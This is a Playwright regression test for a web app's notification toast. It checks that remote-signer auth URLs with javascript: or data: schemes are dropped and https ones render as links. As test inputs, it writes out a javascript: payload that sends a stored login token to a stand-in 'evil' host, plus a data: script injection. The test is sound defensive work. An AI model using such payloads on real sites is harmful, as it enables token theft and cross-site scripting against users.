import { test, expect } from '@playwright/test';

/**
 * Regression: SignerToast must never render a NIP-46 auth_url that isn't a
 * plain http(s) URL. The auth_url comes verbatim from a (possibly rogue)
 * remote signer; a `javascript:` URI in a clickable href would be XSS in the
 * BIES origin. Both the dispatcher (nostrConnectService.handleAuthUrl) and
 * the component guard on isSafeAuthUrl — this exercises the component layer.
 */

test.describe('SignerToast auth_url XSS guard', () => {
    test('javascript: auth_url is dropped; https: auth_url renders a link', async ({ page }) => {
        await page.goto('/login');

        // Malicious scheme → no toast, no link
        await page.evaluate(() => {
            window.dispatchEvent(new CustomEvent('bies:nip46-auth-url', {
                detail: { url: "javascript:fetch('//evil/'+localStorage.getItem('bies_token'))" },
            }));
        });
        await page.waitForTimeout(300);
        await expect(page.locator('[data-testid="signer-toast"]')).toHaveCount(0);

        // data: scheme → also dropped
        await page.evaluate(() => {
            window.dispatchEvent(new CustomEvent('bies:nip46-auth-url', {
                detail: { url: 'data:text/html,<script>alert(1)</script>' },
            }));
        });
        await page.waitForTimeout(300);
        await expect(page.locator('[data-testid="signer-toast"]')).toHaveCount(0);

        // Legitimate https approval URL → toast with a real link
        await page.evaluate(() => {
            window.dispatchEvent(new CustomEvent('bies:nip46-auth-url', {
                detail: { url: 'https://nsec.app/approve?req=abc123' },
            }));
        });
        const toast = page.locator('[data-testid="signer-toast"]');
        await expect(toast).toBeVisible();
        const href = await toast.locator('a').getAttribute('href');
        expect(href).toBe('https://nsec.app/approve?req=abc123');
    });
});
